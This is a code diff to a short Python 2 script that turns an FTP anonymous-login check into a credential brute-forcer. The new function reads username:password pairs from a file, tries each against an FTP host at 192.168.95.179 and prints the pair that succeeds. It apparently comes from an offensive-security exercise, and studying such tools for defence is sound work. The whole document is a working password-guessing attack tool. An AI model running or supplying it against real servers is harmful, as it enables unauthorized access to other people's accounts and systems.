@@ -1,21 +1,33 @@
 import ftplib
 
-def anonLogin(hostname):
+def bruteLogin(hostname, passwdFile):
 
-	try:
-		ftp = ftplib.FTP(hostname)
-		ftp.login('anonymous', 'me@you.com')
-		print '\n[*] ' +str(hostname) +\
-			' FTP Anonymous Logon succeed.'
-		ftp.quit()
-		return True
+	pF = open(passwdFile, 'r')
 
-	except Exception, e:
-		print '\n[-] ' + str(hostname) +\
-			' FTP Anonymous Logon Failed.'
-		return False
+	for line in pF.readlines():
+		userName = line.split(':')[0]
+		passWord = line.split(':')[1].strip('\r').strip('\n')
+		print "[+] Trying: "+userName+"/"+passWord
+
+		try:
+			ftp = ftplib.FTP(hostname)
+			ftp.login(userName, passWord)
+			print '\n[*] ' + str(hostname) +\
+			' FTP Logon Succeeded: '+userName+"/"+passWord
+			ftp.quit()
+			return (userName, passWord)
+
+		except Exception, e:
+			pass
+
+	print '\n[-] Could not brute force FTP credentials.'
+	return (None, None)
 
 host = '192.168.95.179'
-anonLogin(host)
+passwdFile = 'userpass.txt'
+bruteLogin(host, passwdFile)
+
+
+
 
 
